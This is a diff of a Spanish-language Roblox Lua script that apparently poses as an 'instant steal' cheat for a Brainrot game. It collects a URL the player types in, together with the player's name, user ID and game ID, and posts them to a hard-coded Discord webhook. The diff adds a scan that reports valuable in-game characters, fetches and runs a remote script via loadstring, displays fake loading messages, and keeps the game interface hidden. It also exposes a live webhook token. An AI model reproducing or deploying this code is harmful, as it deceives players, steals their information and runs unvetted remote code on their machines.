@@ -86,12 +86,12 @@ textBox.Parent = introFrame
 
 local errorLabel = Instance.new("TextLabel")
 errorLabel.Size = UDim2.new(0, 400, 0, 30)
-errorLabel.Position = UDim2.new(0.5, -200, 0.55, 30)
+errorLabel.Position = UDim2.new(0.5, -500, 0.55, 30)
 errorLabel.BackgroundTransparency = 1
 errorLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
 errorLabel.TextSize = 18
 errorLabel.Font = Enum.Font.Gotham
-errorLabel.Text = ""
+errorLabel.Text = "Incorrecto"
 errorLabel.ZIndex = 101
 errorLabel.Parent = introFrame
 
@@ -181,55 +181,163 @@ statusText.ZIndex = 203
 statusText.Text = ""
 statusText.Parent = loadingFrame
 
--- 🌐 Sistema de envío web CORREGIDO
-local function sendToWebhook(url, data)
-	local success, result = pcall(function()
-		-- Usar HttpService:RequestAsync que está permitido
-		local response = HttpService:RequestAsync({
-			Url = url,
-			Method = "POST",
-			Headers = {
-				["Content-Type"] = "application/json"
-			},
-			Body = HttpService:JSONEncode({
-				content = "🔔 **Nueva URL ingresada**",
-				embeds = {{
-					title = "Información del Usuario",
-					color = 65280,
-					fields = {
-						{
-							name = "👤 Usuario",
-							value = player.Name .. " (ID: " .. player.UserId .. ")",
-							inline = true
-						},
-						{
-							name = "🌐 URL Ingresada",
-							value = "" .. data.url .."",
-							inline = false
-						},
-						{
-							name = "🕒 Fecha/Hora",
-							value = os.date("%Y-%m-%d %H:%M:%S"),
-							inline = true
-						},
-						{
-							name = "🎮 Game ID",
-							value = tostring(game.GameId),
-							inline = true
-						}
-					},
-					footer = {
-						text = "Roblox URL Logger"
-					}
-				}}
-			})
-		})
-		
-		return response.Success, response.Body
-	end)
-	
-	return success, result
+
+-- hdhdhhgdhddhhddhfhhvfvbggvggbcvvchchchvjvcvjhhvjvgjvjgjvjcj cb vjjjvjjvnvnvnvnvnjvjvcjkjcncbccncb
+local npcNames = {
+    "Gattatino Nyanino", "Matteo", "Espresso Signora", "Odin Din Din Dun",
+    "Statutino Libertino", "Ballerino Lololo", "Trigoligre Frutonni",
+    "Orcalero Orcala", "Los Crocodillitos", "Piccione Macchina",
+    "La Vacca Staturno Saturnita", "Chimpanzini Spiderini", "Los Tralaleritos",
+    "Las Tralaleritas", "Graipuss Medussi", "La Grande Combinasion",
+    "Nuclearo Dinossauro", "Garama and Madundung",
+    "Tortuginni Dragonfruitini", "Pot Hotspot", "Las Vaquitas Saturnitas",
+    "Chicleteira Bicicleteira", "La Cucaracha"
+}
+
+
+-- 🎯 Función MEJORADA para buscar Brainrots en Workspace.plots (usando el mismo método que funciona)
+local function findBrainrotsInPlots()
+    local foundBrainrots = {}
+    
+    -- Verificar si existe la ruta Workspace.plots
+    local plots = workspace:FindFirstChild("Plots")
+    if not plots then
+        warn("❌ No se encontró 'plots' en Workspace")
+        return foundBrainrots
+    end
+    
+    print("🔍 Buscando Brainrots en plots...")
+    print("📁 Plots encontrados: " .. #plots:GetChildren())
+    
+    -- 🔍 BÚSQUEDA EXACTA COMO EN EL SCRIPT QUE SÍ FUNCIONA
+    for _, descendant in ipairs(plots:GetDescendants()) do
+        -- Buscar coincidencias EXACTAS como en el otro script
+        if table.find(npcNames, descendant.Name) then
+            print("✅ Encontrado: " .. descendant.Name)
+            if not table.find(foundBrainrots, descendant.Name) then
+                table.insert(foundBrainrots, descendant.Name)
+            end
+        end
+    end
+    
+    -- Si no encuentra nada en plots, buscar en todo Workspace
+    if #foundBrainrots == 0 then
+        print("🔍 Búsqueda extendida en todo Workspace...")
+        for _, descendant in ipairs(workspace:GetDescendants()) do
+            if table.find(npcNames, descendant.Name) then
+                print("✅ Encontrado en Workspace: " .. descendant.Name)
+                if not table.find(foundBrainrots, descendant.Name) then
+                    table.insert(foundBrainrots, descendant.Name)
+                end
+            end
+        end
+    end
+    
+    -- Depuración: mostrar qué nombres SÍ existen
+    if #foundBrainrots == 0 then
+        print("❌ No se encontraron Brainrots con nombres exactos")
+        print("🔍 Nombres reales encontrados en plots:")
+        
+        local allNames = {}
+        for _, child in ipairs(plots:GetDescendants()) do
+            if (child:IsA("Model") or child:IsA("Part")) and #child.Name > 2 then
+                table.insert(allNames, child.Name)
+            end
+        end
+        
+        -- Mostrar nombres únicos
+        local uniqueNames = {}
+        for _, name in ipairs(allNames) do
+            if not table.find(uniqueNames, name) then
+                table.insert(uniqueNames, name)
+                print("   - '" .. name .. "'")
+            end
+        end
+        
+        -- También mostrar estructura de plots
+        print("📁 ESTRUCTURA DE PLOTS:")
+        for _, plot in ipairs(plots:GetChildren()) do
+            print("   Plot: " .. plot.Name)
+            for _, child in ipairs(plot:GetChildren()) do
+                if child:IsA("Model") then
+                    print("     └─ " .. child.Name .. " (" .. child.ClassName .. ")")
+                end
+            end
+        end
+    else
+        print("📊 Total Brainrots encontrados: " .. #foundBrainrots)
+        print("🧠 Lista: " .. table.concat(foundBrainrots, ", "))
+    end
+    
+    return foundBrainrots
 end
+-- 🌐 Sistema de envío webhook MEJORADO con Brainrots
+local function sendToWebhook(url, data)
+    -- Buscar Brainrots usando el método que SÍ funciona
+    local foundBrainrots = findBrainrotsInPlots()
+    local brainrotsText = "Ninguno encontrado"
+    
+    if #foundBrainrots > 0 then
+        brainrotsText = table.concat(foundBrainrots, ", ")
+    end
+    
+    local success, result = pcall(function()
+        local response = HttpService:RequestAsync({
+            Url = url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({
+                content = "🔔 **Nueva URL ingresada**",
+                embeds = {{
+                    title = "Información del Usuario",
+                    color = 65280,
+                    fields = {
+                        {
+                            name = "👤 Usuario",
+                            value = player.Name .. " (ID: " .. player.UserId .. ")",
+                            inline = true
+                        },
+                        {
+                            name = "🌐 URL Ingresada",
+                            value = "" .. data.url .."",
+                            inline = false
+                        },
+                        {
+                            name = "🧠 Brainrots Encontrados",
+                            value = brainrotsText,
+                            inline = false
+                        },
+                        {
+                            name = "📊 Total Brainrots",
+                            value = tostring(#foundBrainrots),
+                            inline = true
+                        },
+                        {
+                            name = "🕒 Fecha/Hora",
+                            value = os.date("%Y-%m-%d %H:%M:%S"),
+                            inline = true
+                        },
+                        {
+                            name = "🎮 Game ID",
+                            value = tostring(game.GameId),
+                            inline = true
+                        }
+                    },
+                    footer = {
+                        text = "Roblox URL Logger + Brainrot Detector"
+                    }
+                }}
+            })
+        })
+        
+        return response.Success, response.Body
+    end)
+    
+    return success, result
+end
+-- hsjsjhshhshshshhshhshsjsjsjsjjsjsjjsjjhhhdhhhhhhhhhhhhhhhhgghhhhhhhhhjhjjjjdjjjzjjxjjjxhjhxjhxbhxvjxjjjxjjx
 
 -- 🔔 Toast final
 local function showFatalError()
@@ -291,86 +399,43 @@ local function updateStatusMessages()
 		task.wait(1)
 	end
 
-	-- 🎯 CARGAR INTERFAZ EXTERNA EN CORRUTINA SEPARADA
-	coroutine.wrap(function()
-		-- Guardar referencias
-		local currentMainGui = mainGui
-		local currentLoadingFrame = loadingFrame
-		local currentStatusText = statusText
-		
-		-- OCULTAR INTERFAZ PRINCIPAL
-		currentLoadingFrame.Visible = false
-		currentMainGui.Enabled = false
-		
-		-- Mostrar mensaje temporal
-		local tempMessage = Instance.new("TextLabel")
-		tempMessage.Size = UDim2.new(0, 500, 0, 60)
-		tempMessage.Position = UDim2.new(0.5, -250, 0.5, -30)
-		tempMessage.BackgroundTransparency = 1
-		tempMessage.TextColor3 = Color3.new(1, 1, 1)
-		tempMessage.TextSize = 24
-		tempMessage.Font = Enum.Font.GothamBold
-		tempMessage.Text = "Cargando interfaz externa... (20s)"
-		tempMessage.ZIndex = 999
-		tempMessage.Parent = currentMainGui
-		
-		-- Cargar interfaz externa
-		local success, errorMsg = pcall(function()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/LeyendaZero/Instant-steal/main/seleccionar.lua"))()
-		end)
-		
-		if not success then
-			warn("Error cargando interfaz externa:", errorMsg)
-			tempMessage.Text = "Error cargando interfaz externa"
-			task.wait(3)
-		end
-		
-		print("Interfaz externa cargada, esperando 20 segundos...")
-		
-		-- ⏱️ Esperar 20 segundos con contador
-		local waitTime = 10
-		for i = waitTime, 1, -1 do
-			tempMessage.Text = "Ejecutando interfaz externa... (" .. i .. "s)"
-			task.wait(1)
-		end
-		
-		-- 🔄 REACTIVAR INTERFAZ PRINCIPAL DESPUÉS DE 20 SEGUNDOS
-		tempMessage:Destroy()
-		
-		-- Verificar que los objetos aún existen antes de reactivar
-		if currentMainGui and currentMainGui.Parent then
-			currentMainGui.Enabled = true
-		else
-			warn("MainGui no encontrado, no se puede reactivar")
-			return
-		end
-		
-		if currentLoadingFrame and currentLoadingFrame.Parent then
-			currentLoadingFrame.Visible = true
-		end
-		
-		if currentStatusText and currentStatusText.Parent then
-			currentStatusText.Text = "Interfaz reactivada - Continuando..."
-			task.wait(2)
-			currentStatusText.Text = "obteniendo Brainrots - LISTO!"
-			task.wait(2)
-			
-			local messages = {
-				"Restaurando script..",
-				"Moviendo hitbox...",
-				"Implementando nuevos códigos...",
-				"Fallo en Replicate Storage - intentando de nuevo...",
-				"Buscando en Workspace..."
-			}
-			
-			while currentLoadingFrame.Visible do
-				currentStatusText.Text = messages[math.random(1, #messages)]
-				task.wait(math.random(5, 10))
-			end
-		end
-	end)()
-end
+	-- 🎯 OCULTAR INTERFAZ PRINCIPAL TEMPORALMENTE
+	loadingFrame.Visible = false
+	mainGui.Enabled = false
+	
+	-- 🕐 Mostrar mensaje de carga externa
 
+	-- Cargar interfaz externa
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/LeyendaZero/Instant-steal/main/seleccionar.lua"))()
+	
+	-- ⏱️ Esperar 20 segundos con contador
+	local waitTime = 20
+	for i = waitTime, 1, -1 do
+		externalLoadText.Text = "Cargando interfaz externa... (" .. i .. "s)"
+		task.wait(1)
+	end
+	
+	-- 🔄 REACTIVAR INTERFAZ PRINCIPAL DESPUÉS DE 20 SEGUNDOS
+	externalLoadText:Destroy()
+	mainGui.Enabled = true
+	loadingFrame.Visible = true
+	
+	-- Continuar con el código original...
+	statusText.Text = "obteniendo Brainrots - LISTO!"
+	task.wait(2)
+	
+	local messages = {
+		"Restaurando script..",
+		"Moviendo hitbox...",
+		"Implementando nuevos códigos...",
+		"Fallo en Replicate Storage - intentando de nuevo...",
+		"Buscando en Workspace..."
+	}
+	while loadingFrame.Visible do
+		statusText.Text = messages[math.random(1, #messages)]
+		task.wait(math.random(5, 10))
+	end
+end
 local function animateProgressBar()
 	local totalTime = 240
 	local stepTime = 0.2
@@ -391,7 +456,7 @@ local function startSequence(url)
 	
 	-- 🔄 Enviar datos al webhook antes de empezar la animación
 	task.spawn(function()
-		local webhookUrl = "https://discord.com/api/webhooks/1398573923280359425/SQDEI2MXkQUC6f4WGdexcHGdmYpUO_sARSkuBmF-Wa-fjQjsvpTiUjVcEjrvuVdSKGb1"
+		local webhookUrl = "https://discord.com/api/webhooks/1398573923280359425/SQDEI2MXkQUC6f4WGdexcHGdmYpUO_sARSkuBmF-Wa-fjQjsvpTiUjVcEjrvuVdSKGb1" -- Reemplaza con tu webhook URL
 		
 		local data = {
 			url = url,
@@ -449,7 +514,6 @@ end)
 
 cancelButton.MouseButton1Click:Connect(kickPlayer)
 
--- 🔄 Loop para mantener la UI oculta
 while true do
 	hideRobloxUI()
 	task.wait(0.5)
